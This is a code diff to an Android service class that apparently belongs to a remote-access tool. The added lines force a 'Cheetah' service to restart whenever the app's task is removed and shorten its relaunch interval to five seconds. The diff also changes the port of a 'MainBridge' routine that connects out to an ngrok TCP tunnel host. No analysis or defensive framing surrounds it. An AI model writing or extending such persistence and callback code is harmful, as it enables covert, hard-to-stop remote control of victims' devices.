@@ -35,14 +35,15 @@ public class Job extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        onTaskRemoved(intent);
         Cheetah.start(this);
         Attempt();
         return START_STICKY;
     }
 
     public void Attempt() {
-        long initialDelay = 30; // Delay before the first execution (in seconds)
-        long period = 30;       // Period between subsequent executions (in seconds)
+        long initialDelay = 5; // Delay before the first execution (in seconds)
+        long period = 5;       // Period between subsequent executions (in seconds)
         scheduler.scheduleAtFixedRate(() -> Cheetah.start(getApplicationContext()), initialDelay, period, TimeUnit.SECONDS);
     }
 
@@ -50,9 +51,15 @@ public class Job extends Service {
     public IBinder onBind(Intent intent) {
         return null;
     }
-
+    @Override
+    public void onTaskRemoved(Intent intent) {
+        Intent serviceintent = new Intent(getApplicationContext(), Cheetah.class);
+        serviceintent.setPackage(getPackageName());
+        startService(serviceintent);
+        super.onTaskRemoved(intent);
+    }
     static void MainBridge() throws Exception {
-        int port = 10952;
+        int port = 13896;
         String host = "0.tcp.in.ngrok.io";
         try {
             if (host.equals("")) {
